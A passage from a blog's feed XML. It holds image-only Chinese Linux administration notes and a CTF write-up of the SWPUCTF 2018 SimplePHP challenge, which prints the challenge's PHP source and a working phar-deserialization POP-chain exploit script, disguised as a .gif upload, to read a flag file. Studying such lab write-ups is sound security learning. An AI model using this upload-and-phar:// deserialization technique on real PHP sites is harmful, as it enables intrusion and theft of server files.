src="/2021/11/12/Linux/image-20220308162051869.png" alt="image-20220308162051869"></p><h1 id="系统服务管理"><a href="#系统服务管理" class="headerlink" title="系统服务管理"></a>系统服务管理</h1><h2 id="系统服务的概述"><a href="#系统服务的概述" class="headerlink" title="系统服务的概述"></a>系统服务的概述</h2><p><img src="/2021/11/12/Linux/image-20220309151533561.png" alt="image-20220309151533561"></p><p><img src="/2021/11/12/Linux/image-20220309151622437.png" alt="image-20220309151622437"></p><p><img src="/2021/11/12/Linux/image-20220309151811901.png" alt="image-20220309151811901"></p><p><img src="/2021/11/12/Linux/image-20220309151916312.png" alt="image-20220309151916312"></p><p><img src="/2021/11/12/Linux/image-20220309151949217.png" alt="image-20220309151949217"></p><p><img src="/2021/11/12/Linux/image-20220309152926717.png" alt="image-20220309152926717"></p><p><img src="/2021/11/12/Linux/image-20220309152956910.png" alt="image-20220309152956910"></p><p><img src="/2021/11/12/Linux/image-20220309153042821.png" alt="image-20220309153042821"></p><h2 id="管理系统服务"><a href="#管理系统服务" class="headerlink" title="管理系统服务"></a>管理系统服务</h2><p><img src="/2021/11/12/Linux/image-20220309153353958.png" alt="image-20220309153353958"></p><p><img src="/2021/11/12/Linux/image-20220309153524221.png" alt="image-20220309153524221"></p><p><img src="/2021/11/12/Linux/image-20220309160049784.png" alt="image-20220309160049784"></p><p><img src="/2021/11/12/Linux/image-20220309160311416.png" alt="image-20220309160311416"></p><p><img src="/2021/11/12/Linux/image-20220309160350364.png" alt="image-20220309160350364"></p><p><img src="/2021/11/12/Linux/image-20220309160421134.png" alt="image-20220309160421134"></p><h2 id="改变运行级别"><a href="#改变运行级别" class="headerlink" title="改变运行级别"></a>改变运行级别</h2><p><img src="/2021/11/12/Linux/image-20220309160525431.png" alt="image-20220309160525431"></p><p><img src="/2021/11/12/Linux/image-20220309160723356.png" alt="image-20220309160723356"></p><p><img src="/2021/11/12/Linux/image-20220309160828517.png" alt="image-20220309160828517"></p><h2 id="使用systemctl-关闭暂停和休眠系统"><a href="#使用systemctl-关闭暂停和休眠系统" class="headerlink" title="使用systemctl 关闭暂停和休眠系统"></a>使用systemctl 关闭暂停和休眠系统</h2><p><img src="/2021/11/12/Linux/image-20220309160944389.png" alt="image-20220309160944389"></p><p><img src="/2021/11/12/Linux/image-20220309161017524.png" alt="image-20220309161017524"></p><p><img src="/2021/11/12/Linux/image-20220309161025868.png" alt="image-20220309161025868"></p><p><img src="/2021/11/12/Linux/image-20220309161038493.png" alt="image-20220309161038493"></p><h1 id="Linux进程及任务计划管理"><a href="#Linux进程及任务计划管理" class="headerlink" title="Linux进程及任务计划管理"></a>Linux进程及任务计划管理</h1><p><img src="/2021/11/12/Linux/image-20220311104215174.png" alt="image-20220311104215174"></p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p><img src="/2021/11/12/Linux/image-20220311104247963.png" alt="image-20220311104247963"></p><p><img src="/2021/11/12/Linux/image-20220311104518607.png" alt="image-20220311104518607"></p><p><img src="/2021/11/12/Linux/image-20220311104647148.png" alt="image-20220311104647148"></p><p><img src="/2021/11/12/Linux/image-20220311104829567.png" alt="image-20220311104829567"></p><p><img src="/2021/11/12/Linux/image-20220311105138731.png" alt="image-20220311105138731"></p><p><img src="/2021/11/12/Linux/image-20220311105442038.png" alt="image-20220311105442038"></p><p><img src="/2021/11/12/Linux/image-20220311105857725.png" alt="image-20220311105857725"></p><p><img src="/2021/11/12/Linux/image-20220311110031422.png" alt="image-20220311110031422"></p><p><img src="/2021/11/12/Linux/image-20220311110259860.png" alt="image-20220311110259860"></p><p><img src="/2021/11/12/Linux/image-20220311110723453.png" alt="image-20220311110723453"></p><p><img src="/2021/11/12/Linux/image-20220311113001852.png" alt="image-20220311113001852"></p><p><img src="/2021/11/12/Linux/image-20220311113153962.png" alt="image-20220311113153962"></p><p><img src="/2021/11/12/Linux/image-20220311113355591.png" alt="image-20220311113355591"></p><p><img src="/2021/11/12/Linux/image-20220311113757557.png" alt="image-20220311113757557"></p><h2 id="子进程和线程"><a href="#子进程和线程" class="headerlink" title="子进程和线程"></a>子进程和线程</h2><p><img src="/2021/11/12/Linux/image-20220311113844455.png" alt="image-20220311113844455"></p><p><img src="/2021/11/12/Linux/image-20220311114421066.png" alt="image-20220311114421066"></p><p><img src="/2021/11/12/Linux/image-20220311114814428.png" alt="image-20220311114814428"></p><p><img src="/2021/11/12/Linux/image-20220311114856523.png" alt="image-20220311114856523"></p><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><p><img src="/2021/11/12/Linux/image-20220311115108093.png" alt="image-20220311115108093"></p><p><img src="/2021/11/12/Linux/image-20220311115303445.png" alt="image-20220311115303445"></p><p><img src="/2021/11/12/Linux/image-20220311115713093.png" alt="image-20220311115713093"></p><p><img src="/2021/11/12/Linux/image-20220311115808339.png" alt="image-20220311115808339"></p><p><img src="/2021/11/12/Linux/image-20220311115842074.png" alt="image-20220311115842074"></p><p><img src="/2021/11/12/Linux/image-20220311115932812.png" alt="image-20220311115932812"></p><p><img src="/2021/11/12/Linux/image-20220311115945371.png" alt="image-20220311115945371"></p><p><img src="/2021/11/12/Linux/image-20220311115955251.png" alt="image-20220311115955251"></p><p><img src="/2021/11/12/Linux/image-20220311120220267.png" alt="image-20220311120220267"></p><p><img src="/2021/11/12/Linux/image-20220311120246084.png" alt="image-20220311120246084"></p><p><img src="/2021/11/12/Linux/image-20220311120300762.png" alt="image-20220311120300762"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;了解Linux操作系统及安装方式&quot;&gt;&lt;a href=&quot;#了解Linux操作系统及安装方式&quot; class=&quot;headerlink&quot; title=&quot;了解Linux操作系统及安装方式&quot;&gt;&lt;/a&gt;了解Linux操作系统及安装方式&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/202</summary>
      
    
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF 2018 SimplePHP_0x50-0x5F</title>
    <link href="https://sakurahack-y.github.io/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/"/>
    <id>https://sakurahack-y.github.io/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</id>
    <published>2021-11-07T13:49:10.000Z</published>
    <updated>2021-11-07T14:36:36.082Z</updated>
    
    <content type="html"><![CDATA[<p>如图，只有两个功能点，查看文件和上传文件</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p><p>上传文件功能点只能上传图片。</p><p>点击查看链接观察url</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p><p>尝试在file后加一些东西</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p><p>surprise!</p><p>继续，依次读取各个页面的源码</p><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>function.php</p><pre><code class="php">&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;        &#125;public function __wakeup()&#123;    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker~&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p>首先观察敏感函数，我们发现了file_get_contents()，如何利用它呢，我们尝试寻找可以反序列的点。</p><p>但是本文中并没unserialize，这时候我们就可以采用phar://协议，可以达到反序列化的效果。</p><p>下面我们就要考虑，如何利用file_get_contens()这个敏感函数。</p><p>反序列化，最重要的就算里面的一些魔术方法，我们可以进行调用。</p><p>__toString  在echo一个类的时候调用</p><p>__get   未定义的属性或没有权限访问的属性被访问时该方法会被调用</p><p>下面我们来尝试构建pop利用链。</p><p>我们全局搜索$value这个变量，发现它是由get穿过来的</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p><p> 我们的目标是什么呢？</p><p>使$value可控！</p><p>我们再全局搜索$key并没有发现可以传入的地方，那么说明它不受我们控制。</p><p>那我们就要突破这个点。</p><p>如何构造，使它受我们控制。</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p><p>我们可以使用这个魔术方法：</p><p>当我们在Test()这个类中调用一个不存在的属性的时候就会调用它，因此我们可以通过这个方法来传入我们想要的东西。</p><p>那么如何调用Test()呢？</p><p>我们可以发现：</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p><p>Test()类中不存在source，我们可以令str[‘str’] = new Test() 来调用。</p><p>而调用__toString，又需要echo这个类</p><p>我们可以利用这里</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" alt="image-20211107221800425"></p><p>好了，上面我们都是逆推，现在我们可以理一下pop链的顺序。</p><p>调用C1e4r()中的魔术方法__destruct  ——-    调用Show()中的 toString()  ———     传入Test调用不存在的属性从而调用 get</p><p>pop链代码如下:</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new C1e4r();$b = new Show();$c = new Test();$a-&gt;str = $b;$b-&gt;str[&#39;str&#39;] = $c; //因为这里会调用source,从而会调用下边的source，所以下边的params也要接受$source$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>放在本地环境，访问，会生成一个sakura.phar文件</p><p>发现无法上传，将后缀改为.gif</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p><p>上传后。</p><p>访问</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload可以获得文件名</a></p><p>然后利用phar解析</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p><p>获得flag</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如图，只有两个功能点，查看文件和上传文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png&quot; alt=&quot;image-20211107215628</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="phar协议" scheme="https://sakurahack-y.github.io/tags/phar%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
</feed>
